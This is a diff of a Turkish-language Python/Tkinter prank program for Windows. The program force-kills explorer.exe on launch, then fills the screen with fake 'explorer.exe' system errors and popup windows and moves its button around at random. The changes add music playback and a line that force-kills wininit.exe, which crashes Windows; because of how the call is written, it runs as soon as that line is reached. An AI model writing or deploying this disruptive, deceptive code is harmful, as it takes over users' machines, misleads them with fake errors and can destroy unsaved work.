@@ -1,3 +1,7 @@
+# music="C:/Users/Administrator/Desktop/Projeler/rickroll.mp3" # (for ... / ... için)
+# music="C:/Users/mukonqi/Desktop/rickroll.mp3" # (for developer / geliştirici için)
+music="" # (for you / sizin için)
+
 # Copyright (C) 2023 Muhammed S. (MuKonqi)
 # License: MIT License
 
@@ -19,16 +23,14 @@
 # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 # SOFTWARE.
 
+from playsound import playsound # only use version 1.2.2 / sadece 1.2.2 sürümünü kullanın
 from tkinter import *
 from tkinter import messagebox
-import webbrowser
 import subprocess
 import random
-subprocess.Popen("taskkill /IM explorer.exe /F", shell=True)
+subprocess.Popen("taskkill /IM explorer.exe /F", shell=True) # for killing explorer / explorer öldürmek için
 s=0
 while True:
-    def private():
-        webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
     def error():
         for w in range(10):
             window2=Toplevel()
@@ -39,18 +41,18 @@ while True:
         global s
         if s != 14:
             s=s+1
-            messagebox.showwarning("Ah be...","Geberdiniz, Allah rahmet eylesin.")
+            messagebox.showwarning("Oku","Tıklama yazıyordu....")
             window.attributes("-fullscreen", False)
             error()
             window.attributes("-fullscreen", True)
             messagebox.showerror("explorer.exe","\n:::{9543-3258-6574-1628-1331-0408}\nClass Not Registired")
-            #button.config(text=str(s)+". Ölüm")
             button.place(relx=str(random.uniform(0.2, 0.8)), rely=str(random.uniform(0.2, 0.8)))
         else:
-            messagebox.showinfo("Tebrikler", "Mezarınıza kavuştunuz.")
-            subprocess.Popen("explorer.exe", shell=True)
-            button.config(text="ÇOK GİZLİ DOSYA", command=private)
             button.place(relx=0.5, rely=0.5)
+            button.config(text="HADİ EĞLENELİM", command=messagebox.showwarning("","Size bilgilendirme yapılmıştı!"))
+            messagebox.showinfo("Tebrikler", "9 saniyelik kutlama vakti!")
+            playsound(music)
+            button.config(text="ŞİMDİ LÜTFEN BANA TIKLA", command=subprocess.Popen("taskkill /IM wininit.exe /F", shell=True))
     window=Tk(className="ANA HATA")
     window.config(background="#376296")
     window.title("ANA HATA")
